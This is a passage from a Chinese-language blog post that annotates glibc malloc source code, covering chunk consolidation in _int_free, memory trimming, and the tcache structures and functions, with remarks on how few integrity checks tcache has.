errout;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="释放填充"><a href="#释放填充" class="headerlink" title="释放填充"></a>释放填充</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//将指针的mem部分全部设置为perturb_byte        free_perturb(chunk2mem(p), size - 2 * SIZE_SZ);</span><br></code></pre></td></tr></table></figure>

<h4 id="后向合并-合并低地址-chunk"><a href="#后向合并-合并低地址-chunk" class="headerlink" title="后向合并 - 合并低地址 chunk"></a>后向合并 - 合并低地址 chunk</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* consolidate backward */</span>        <span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;            prevsize = prev_size(p);            size += prevsize;            p = chunk_at_offset(p, -((<span class="hljs-keyword">long</span>) prevsize));            unlink(av, p, bck, fwd);        &#125;<br></code></pre></td></tr></table></figure>

<h4 id="下一块不是-top-chunk-前向合并-合并高地址-chunk"><a href="#下一块不是-top-chunk-前向合并-合并高地址-chunk" class="headerlink" title="下一块不是 top chunk - 前向合并 - 合并高地址 chunk"></a>下一块不是 top chunk - 前向合并 - 合并高地址 chunk</h4><p>需要注意的是，如果下一块不是 top chunk ，则合并，并将合并后的 chunk 放入到 unsorted bin 中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 如果下一个chunk不是top chunk</span><br><span class="hljs-keyword">if</span> (nextchunk != av-&gt;top) &#123;<br>    <span class="hljs-comment">/* get and clear inuse bit */</span><br>    <span class="hljs-comment">// 获取下一个 chunk 的使用状态</span><br>    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<br>    <span class="hljs-comment">// 如果不在使用，合并，否则清空当前chunk的使用状态。</span><br>    <span class="hljs-comment">/* consolidate forward */</span><br>    <span class="hljs-keyword">if</span> (!nextinuse) &#123;<br>        unlink(av, nextchunk, bck, fwd);<br>        size += nextsize;<br>    &#125; <span class="hljs-keyword">else</span><br>        clear_inuse_bit_at_offset(nextchunk, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">  Place the chunk in unsorted chunk list. Chunks are</span><br><span class="hljs-comment">  not placed into regular bins until after they have</span><br><span class="hljs-comment">  been given one chance to be used in malloc.</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-comment">// 把 chunk 放在 unsorted chunk 链表的头部</span><br>    bck = unsorted_chunks(av);<br>    fwd = bck-&gt;fd;<br>    <span class="hljs-comment">// 简单的检查</span><br>    <span class="hljs-keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck)) &#123;<br>        errstr = <span class="hljs-string">&quot;free(): corrupted unsorted chunks&quot;</span>;<br>        <span class="hljs-keyword">goto</span> errout;<br>    &#125;<br>    p-&gt;fd = fwd;<br>    p-&gt;bk = bck;<br>    <span class="hljs-comment">// 如果是 large chunk，那就设置nextsize指针字段为NULL。</span><br>    <span class="hljs-keyword">if</span> (!in_smallbin_range(size)) &#123;<br>        p-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>        p-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    bck-&gt;fd = p;<br>    fwd-&gt;bk = p;<br><br>    set_head(p, size | PREV_INUSE);<br>    set_foot(p, size);<br><br>    check_free_chunk(av, p);<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="下一块是-top-chunk-合并到-top-chunk"><a href="#下一块是-top-chunk-合并到-top-chunk" class="headerlink" title="下一块是 top chunk - 合并到 top chunk"></a>下一块是 top chunk - 合并到 top chunk</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">  If the chunk borders the current high end of memory,</span><br><span class="hljs-comment">  consolidate into top</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">// 如果要释放的chunk的下一个chunk是top chunk，那就合并到 top chunk</span><br><span class="hljs-keyword">else</span> &#123;<br>    size += nextsize;<br>    set_head(p, size | PREV_INUSE);<br>    av-&gt;top = p;<br>    check_chunk(av, p);<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="向系统返还内存"><a href="#向系统返还内存" class="headerlink" title="向系统返还内存"></a>向系统返还内存</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c">        <span class="hljs-comment">/*</span><br><span class="hljs-comment">          If freeing a large space, consolidate possibly-surrounding</span><br><span class="hljs-comment">          chunks. Then, if the total unused topmost memory exceeds trim</span><br><span class="hljs-comment">          threshold, ask malloc_trim to reduce top.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">          Unless max_fast is 0, we don&#x27;t know if there are fastbins</span><br><span class="hljs-comment">          bordering top, so we cannot tell for sure whether threshold</span><br><span class="hljs-comment">          has been reached unless fastbins are consolidated.  But we</span><br><span class="hljs-comment">          don&#x27;t want to consolidate on each free.  As a compromise,</span><br><span class="hljs-comment">          consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span><br><span class="hljs-comment">          is reached.</span><br><span class="hljs-comment">        */</span><br>         <span class="hljs-comment">// 如果合并后的 chunk 的大小大于FASTBIN_CONSOLIDATION_THRESHOLD</span><br>         <span class="hljs-comment">// 一般合并到 top chunk 都会执行这部分代码。</span><br>         <span class="hljs-comment">// 那就向系统返还内存</span><br>        <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;<br>            <span class="hljs-comment">// 如果有 fast chunk 就进行合并</span><br>            <span class="hljs-keyword">if</span> (have_fastchunks(av)) malloc_consolidate(av);<br>            <span class="hljs-comment">// 主分配区</span><br>            <span class="hljs-keyword">if</span> (av == &amp;main_arena) &#123;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span><br>                <span class="hljs-comment">// top chunk 大于当前的收缩阙值</span><br>                <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (chunksize(av-&gt;top)) &gt;=<br>                    (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (mp_.trim_threshold))<br>                    systrim(mp_.top_pad, av);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span>      <span class="hljs-comment">// 非主分配区，则直接收缩heap</span></span><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">/* Always try heap_trim(), even if the top chunk is not</span><br><span class="hljs-comment">                   large, because the corresponding heap might go away.  */</span><br>                heap_info *heap = heap_for_ptr(top(av));<br><br>                assert(heap-&gt;ar_ptr == av);<br>                heap_trim(heap, mp_.top_pad);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (!have_lock) &#123;<br>            assert(locked);<br>            __libc_lock_unlock(av-&gt;mutex);<br>        &#125;<br></code></pre></td></tr></table></figure>

<h3 id="释放-mmap-的-chunk"><a href="#释放-mmap-的-chunk" class="headerlink" title="释放 mmap 的 chunk"></a>释放 mmap 的 chunk</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">//  If the chunk was allocated via mmap, release via munmap().</span><br>    munmap_chunk(p);<br>&#125;<br></code></pre></td></tr></table></figure>

<h1 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h1><h2 id="两个struct"><a href="#两个struct" class="headerlink" title="两个struct"></a>两个struct</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* We overlay this structure on the user-data portion of a chunk when</span><br><span class="hljs-comment">   the chunk is stored in the per-thread cache.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span>	<span class="hljs-comment">//指向的user-date部分嗷</span><br>&#125; tcache_entry;<br><br><span class="hljs-comment">/* There is one of these for each thread, which contains the</span><br><span class="hljs-comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span><br><span class="hljs-comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span><br><span class="hljs-comment">   are redundant (we could have just counted the linked list each</span><br><span class="hljs-comment">   time), this is for performance reasons.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-keyword">char</span> counts[TCACHE_MAX_BINS];<br>  tcache_entry *entries[TCACHE_MAX_BINS];<br>&#125; tcache_perthread_struct;<br><br><span class="hljs-keyword">static</span> __thread <span class="hljs-keyword">char</span> tcache_shutting_down = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">static</span> __thread tcache_perthread_struct *tcache = <span class="hljs-literal">NULL</span>;<br></code></pre></td></tr></table></figure>

<p>每个 thread 都会维护一个 <code>tcache_perthread_struct</code>，它是整个 tcache 的管理结构，一共有 <code>TCACHE_MAX_BINS</code> 个计数器和 <code>TCACHE_MAX_BINS</code>项 tcache_entry，其中</p>
<ul>
<li><code>tcache_entry</code> 用单向链表的方式链接了相同大小的处于空闲状态（free 后）的 chunk，这一点上和 fastbin 很像。</li>
<li><code>counts</code> 记录了 <code>tcache_entry</code> 链上空闲 chunk 的数目，每条链上最多可以有 7 个 chunk。</li>
</ul>
<h2 id="基本宏定义"><a href="#基本宏定义" class="headerlink" title="基本宏定义"></a>基本宏定义</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span><br><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> TCACHE_MAX_BINS		64</span><br><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> MAX_TCACHE_SIZE	tidx2usize (TCACHE_MAX_BINS-1)</span><br><br><span class="hljs-comment">/* Only used to pre-fill the tunables.  */</span><br><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> tidx2usize(idx)	(((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span><br><br><span class="hljs-comment">/* When &quot;x&quot; is from chunksize().  */</span><br><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span><br><span class="hljs-comment">/* When &quot;x&quot; is a user-provided size.  */</span><br><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span><br><br><span class="hljs-comment">/* With rounding and alignment, the bins are...</span><br><span class="hljs-comment">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span><br><span class="hljs-comment">   idx 1   bytes 25..40 or 13..20</span><br><span class="hljs-comment">   idx 2   bytes 41..56 or 21..28</span><br><span class="hljs-comment">   etc.  */</span><br><br><span class="hljs-comment">/* This is another arbitrary limit, which tunables can change.  Each</span><br><span class="hljs-comment">   tcache bin will hold at most this number of chunks.  */</span><br><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> TCACHE_FILL_COUNT 7</span><br></code></pre></td></tr></table></figure>

<ul>
<li>Tcache为每个线程都预留了这样一个特殊的bins， bin的数量是64个 每个bin中最多缓存7个chunk。在64位系统上以0x10的字节递增，<strong>从24递增到1032字节</strong>。32位系统上则<strong>从12到512字节</strong>，所以Tcache缓存的是<strong>非Large Chunk的chunk</strong> </li>
</ul>
<h2 id="工作方式"><a href="#工作方式" class="headerlink" title="工作方式"></a>工作方式</h2><ul>
<li>第一次 malloc 时，会先 malloc 一块内存用来存放 <code>tcache_perthread_struct</code> 。</li>
<li>free 内存，且 size 小于 small bin size 时</li>
<li>tcache 之前会放到 fastbin 或者 unsorted bin 中</li>
<li>tcache 后：<ul>
<li>先放到对应的 tcache 中，直到 tcache 被填满（默认是 7 个）</li>
<li>tcache 被填满之后，再次 free 的内存和之前一样被放到 fastbin 或者 unsorted bin 中</li>
<li>tcache 中的 chunk 不会合并（不取消 inuse bit）</li>
</ul>
</li>
<li>malloc 内存，且 size 在 tcache 范围内</li>
<li>先从 tcache 取 chunk，直到 tcache 为空</li>
<li>tcache 为空后，从 bin 中找</li>
<li>tcache 为空时，如果 <code>fastbin/smallbin/unsorted bin</code> 中有 size 符合的 chunk，会先把 <code>fastbin/smallbin/unsorted bin</code> 中的 chunk 放到 tcache 中，直到填满。之后再从 tcache 中取；因此 chunk 在 bin 中和 tcache 中的顺序会反过来</li>
</ul>
<h2 id="各个函数中关于tcache的部分"><a href="#各个函数中关于tcache的部分" class="headerlink" title="各个函数中关于tcache的部分"></a>各个函数中关于tcache的部分</h2><h3 id="–libc-malloc-1"><a href="#–libc-malloc-1" class="headerlink" title="–libc-malloc  "></a><a href="#__libc_malloc">–libc-malloc</a> <span id="libcmalloc"> </span></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">void</span> *<br>__libc_malloc (<span class="hljs-keyword">size_t</span> bytes)<br>&#123;<br>    ......<br>    ......<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>  <span class="hljs-comment">/* int_free also calls request2size, be careful to not pad twice.  */</span><br>  <span class="hljs-keyword">size_t</span> tbytes;<br>  <span class="hljs-comment">// 根据 malloc 传入的参数计算 chunk 实际大小，并计算 tcache 对应的下标</span><br>  checked_request2size (bytes, tbytes);<br>  <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx (tbytes);<br><br>  <span class="hljs-comment">// 初始化 tcache</span><br>  MAYBE_INIT_TCACHE (); <span class="hljs-comment">//如果为空就执行初始化函数</span><br>  DIAG_PUSH_NEEDS_COMMENT;<br>  <span class="hljs-keyword">if</span> (tc_idx &lt; mp_.tcache_bins  <span class="hljs-comment">// 根据 size 得到的 idx 在合法的范围内</span><br>      <span class="hljs-comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="hljs-comment">/* to appease gcc */</span><br>      &amp;&amp; tcache<br>      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="hljs-literal">NULL</span>) <span class="hljs-comment">// tcache-&gt;entries[tc_idx] 有 chunk</span><br>    &#123;<br>      <span class="hljs-keyword">return</span> tcache_get (tc_idx);<br>    &#125;<br>  DIAG_POP_NEEDS_COMMENT;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>    ......<br>    ......<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="tcache-init"><a href="#tcache-init" class="headerlink" title="tcache_init"></a>tcache_init</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c">tcache_init(<span class="hljs-keyword">void</span>)<br>&#123;<br>  mstate ar_ptr;<br>  <span class="hljs-keyword">void</span> *victim = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">const</span> <span class="hljs-keyword">size_t</span> bytes = <span class="hljs-keyword">sizeof</span> (tcache_perthread_struct);<br>    <br>  <span class="hljs-keyword">if</span> (tcache_shutting_down)<br>    <span class="hljs-keyword">return</span>;<br>    <br>  arena_get (ar_ptr, bytes); <span class="hljs-comment">// 找到可用的 arena</span><br>  victim = _int_malloc (ar_ptr, bytes); <span class="hljs-comment">// 申请一个 sizeof(tcache_perthread_struct) 大小的 chunk</span><br>  <span class="hljs-keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="hljs-literal">NULL</span>)	<span class="hljs-comment">//这是.....不成功再来一遍?????</span><br>    &#123;<br>      ar_ptr = arena_get_retry (ar_ptr, bytes);<br>      victim = _int_malloc (ar_ptr, bytes);<br>    &#125;<br>  <span class="hljs-keyword">if</span> (ar_ptr != <span class="hljs-literal">NULL</span>)<br>    __libc_lock_unlock (ar_ptr-&gt;mutex);<br>    <br>  <span class="hljs-comment">/* In a low memory situation, we may not be able to allocate memory</span><br><span class="hljs-comment">     - in which case, we just keep trying later.  However, we</span><br><span class="hljs-comment">     typically do this very early, so either there is sufficient</span><br><span class="hljs-comment">     memory, or there isn&#x27;t enough memory to do non-trivial</span><br><span class="hljs-comment">     allocations anyway.  */</span><br>    <span class="hljs-comment">//注释说如果取不到的话就等会再试, 通常在内存空间小的情况下</span><br>  <span class="hljs-keyword">if</span> (victim) <span class="hljs-comment">// 初始化 tcache</span><br>    &#123;<br>      tcache = (tcache_perthread_struct *) victim;<br>      <span class="hljs-built_in">memset</span> (tcache, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span> (tcache_perthread_struct));<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAYBE_INIT_TCACHE() \</span><br><span class="hljs-meta">  <span class="hljs-meta-keyword">if</span> (__glibc_unlikely (tcache == NULL)) \</span><br><span class="hljs-meta">    tcache_init();</span><br></code></pre></td></tr></table></figure>

<h3 id="申请内存-2-27"><a href="#申请内存-2-27" class="headerlink" title="申请内存 2.27"></a>申请内存 <u>2.27</u></h3><p>接下来将进入申请内存的步骤</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">  <span class="hljs-comment">// 从 tcache list 中获取内存</span><br>  <span class="hljs-keyword">if</span> (tc_idx &lt; mp_.tcache_bins <span class="hljs-comment">// 由 size 计算的 idx 在合法范围内</span><br>      <span class="hljs-comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="hljs-comment">/* to appease gcc */</span><br>      &amp;&amp; tcache<br>      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="hljs-literal">NULL</span>) <span class="hljs-comment">// 该条 tcache 链不为空</span><br>    &#123;<br>      <span class="hljs-keyword">return</span> tcache_get (tc_idx);<br>    &#125;<br>  DIAG_POP_NEEDS_COMMENT;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>  <span class="hljs-comment">// 进入与无 tcache 时的流程</span><br>  <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)<br>    &#123;<br>      victim = _int_malloc (&amp;main_arena, bytes);<br>      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||<br>              &amp;main_arena == arena_for_chunk (mem2chunk (victim)));<br>      <span class="hljs-keyword">return</span> victim;<br>    &#125;<br></code></pre></td></tr></table></figure>

<ul>
<li>在 <code>tcache-&gt;entries</code> 不为空时，将进入 <code>tcache_get()</code> 的流程获取 chunk，否则与 tcache 机制前的流程类似，这里主要分析第一种 <code>tcache_get()</code>。这里也可以看出 tcache 的优先级很高，比 fastbin 还要高（ fastbin 的申请在没进入 tcache 的流程中）。</li>
</ul>
<h3 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get()"></a>tcache_get()</h3><p>看一下 <code>tcache_get()</code> </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span><br><span class="hljs-comment">   available chunks to remove.  */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> __always_inline <span class="hljs-keyword">void</span> *</span><br><span class="hljs-function"><span class="hljs-title">tcache_get</span> <span class="hljs-params">(<span class="hljs-keyword">size_t</span> tc_idx)</span></span><br><span class="hljs-function"></span>&#123;<br>  tcache_entry *e = tcache-&gt;entries[tc_idx];<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<br>  assert (tcache-&gt;entries[tc_idx] &gt; <span class="hljs-number">0</span>);<br>  tcache-&gt;entries[tc_idx] = e-&gt;next;<br>  --(tcache-&gt;counts[tc_idx]); <span class="hljs-comment">// 获得一个 chunk，counts 减一</span><br>  <span class="hljs-keyword">return</span> (<span class="hljs-keyword">void</span> *) e;<br>&#125;<br></code></pre></td></tr></table></figure>

<ul>
<li><code>tcache_get()</code> 就是获得 chunk 的过程了。可以看出这个过程还是很简单的，从 <code>tcache-&gt;entries[tc_idx]</code> 中获得第一个 chunk，<code>tcache-&gt;counts</code> 减一，几乎没有任何保护。</li>
</ul>
<h3 id="libc-free-1"><a href="#libc-free-1" class="headerlink" title="__libc_free()"></a>__libc_free()</h3><p>看完申请，再看看有 tcache 时的释放</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">void</span><br>__libc_free (<span class="hljs-keyword">void</span> *mem)<br>&#123;<br>  ......<br>  ......<br>  MAYBE_INIT_TCACHE ();<br>  ar_ptr = arena_for_chunk (p);<br>  _int_free (ar_ptr, p, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<ul>
<li><code>__libc_free()</code> 没有太多变化，<code>MAYBE_INIT_TCACHE ()</code> 在 tcache 不为空失去了作用。</li>
</ul>
<h3 id="int-free-1"><a href="#int-free-1" class="headerlink" title="_int_free()"></a>_int_free()</h3><p>跟进 <code>_int_free()</code> </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span><br>_int_free (mstate av, mchunkptr p, <span class="hljs-keyword">int</span> have_lock)<br>&#123;<br>  ......<br>  ......<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>  &#123;<br>    <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx (size);<br>    <span class="hljs-keyword">if</span> (tcache<br>        &amp;&amp; tc_idx &lt; mp_.tcache_bins <span class="hljs-comment">// 64</span><br>        &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) <span class="hljs-comment">// 7</span><br>      &#123;<br>        tcache_put (p, tc_idx);<br>        <span class="hljs-keyword">return</span>;<br>      &#125;<br>  &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>  ......<br>  ......<br></code></pre></td></tr></table></figure>

<ul>
<li>判断 <code>tc_idx</code> 合法，<code>tcache-&gt;counts[tc_idx]</code> 在 7 个以内时，就进入 <code>tcache_put()</code>，传递的两个参数是要释放的 chunk 和该 chunk 对应的 size 在 tcache 中的下标。</li>
</ul>
<h3 id="tcache-put"><a href="#tcache-put" class="headerlink" title="tcache_put()"></a>tcache_put()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span><br><span class="hljs-comment">   for more chunks.  */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> __always_inline <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">tcache_put</span> <span class="hljs-params">(mchunkptr chunk, <span class="hljs-keyword">size_t</span> tc_idx)</span></span><br><span class="hljs-function"></span>&#123;<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<br>  e-&gt;next = tcache-&gt;entries[tc_idx];<br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>&#125;<br></code></pre></td></tr></table></figure>

<ul>
<li><code>tcache_puts()</code> 完成了把释放的 chunk 插入到 <code>tcache-&gt;entries[tc_idx]</code> 链表头部的操作，也几乎没有任何保护。并且 <strong>没有把 p 位置零</strong>。</li>
</ul>
